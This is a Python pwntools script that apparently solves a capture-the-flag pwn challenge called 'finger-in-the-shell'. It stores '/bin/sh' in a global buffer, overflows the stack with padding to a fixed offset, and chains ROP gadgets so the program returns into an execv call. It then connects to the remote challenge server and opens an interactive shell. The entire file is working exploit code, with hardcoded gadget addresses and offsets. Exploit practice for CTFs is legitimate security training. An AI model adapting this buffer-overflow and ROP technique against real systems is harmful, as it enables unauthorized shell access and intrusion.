#!/usr/bin/python3

from pwn import *

#address of exec func
exec = p64(0x0040154b)
#address of exec call
strexec = p64(0x0040155c)
#address of "log"
log_addr = 0x00404120

#offset to set rbp
rbp_off = 544
#offset to set return addr
exec_off = 552

#Rop gadgets found thap pop a value off the stack and return
setrdi = p64(0x4016c3)
#This one also pops to R15 so I needed to add a padded value in the exec
setrsi = p64(0x4016c1)


#Command to write to "log" and then execute
log = b'/bin/sh' + b'\0'
loglen = len(log)

#pointer to log (for execv's argv)
log += p64(log_addr)
#should have added a NULL pointer here for consistancy

#padding
exp = b'A'*rbp_off
#set rdp for execv func; old code, unneeded in final version (I think)
exp += p64(log_addr+0x260)


#padding between rbp and return... useless code, it should always be zero
exec_pad = exec_off - len(exp)
exp += b'B'*exec_pad

#set rdi to "log"
exp += setrdi + p64(log_addr)
#set rsi to point to "log"; also set R15 but serves no purpose
exp += setrsi + p64(log_addr + loglen ) + p64(0)

#return to the execv call (with rdi and rsi set)
exp += strexec

#extra padding for debugging
exp += b'C'*100

cmd = b"whoami\n"

#sys.stdout.buffer.write(log + b'\n' + exp  + b'\n' + cmd)
#exit()

prg = remote("srv2.magpiectf.ca", 6000)
#prg = process('./finger-in-the-shell')

print(prg.recv())
prg.sendline(log)
print("sending log")
print(prg.recv())
prg.sendline(exp)
print("sending exp")
#print(prg.recv())
#prg.sendline(cmd)
#print("sending cmd")
#print(prg.recv())
prg.interactive()
